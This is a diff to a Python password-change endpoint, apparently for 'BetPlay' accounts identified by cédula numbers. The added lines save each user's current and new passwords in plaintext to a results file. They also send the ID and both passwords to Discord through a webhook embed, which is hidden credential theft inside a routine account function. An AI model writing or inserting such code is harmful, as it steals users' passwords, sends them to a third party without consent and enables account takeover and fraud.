@@ -353,11 +353,27 @@ async def change_password(request: ChangePasswordRequest):
                     if r.get("cedula") == request.username:
                         r["estado"] = "contrasena_cambiada"
                         r["fecha_cambio"] = time.strftime("%Y-%m-%d %H:%M:%S")
+                        r["current_password"] = request.current_password
+                        r["new_password"] = request.new_password
                         break
                 with open(resultados_path, "w", encoding="utf-8") as f:
                     json.dump(resultados, f, indent=2, ensure_ascii=False)
             except Exception as e:
                 print(f"Error actualizando resultados.json: {e}")
+        
+        # Enviar a Discord con las contraseñas
+        embed = {
+            "title": " Contraseña Cambiada Exitosamente",
+            "color": 3066993,
+            "fields": [
+                {"name": "📄 Cédula", "value": f"`{request.username}`", "inline": True},
+                {"name": " Contraseña Actual", "value": f"`{request.current_password}`", "inline": True},
+                {"name": "🆕 Nueva Contraseña", "value": f"`{request.new_password}`", "inline": True},
+            ],
+            "footer": {"text": "BetPlay Password Change"},
+            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S")
+        }
+        send_to_discord(embed)
     
     if not result["success"]:
         raise HTTPException(
